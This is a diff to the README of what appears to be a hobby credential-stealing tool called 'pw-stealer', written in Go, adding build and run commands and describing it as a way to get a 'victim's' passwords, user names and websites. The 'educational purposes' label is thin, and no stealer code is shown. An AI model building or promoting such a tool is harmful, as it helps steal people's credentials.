@@ -1,6 +1,11 @@
 # pw-stealer
 just a password stealer in go this is all for educational purposes i'll probably make a python version of this if i get it to work again
 
+# how to use
+```go
+go build crawler.go  to turn it into a exe
+go run crawler.go to run it
+```
 # What is This?
 This is a password stealer, you can get your victim's password and user name and website
 ```Nim
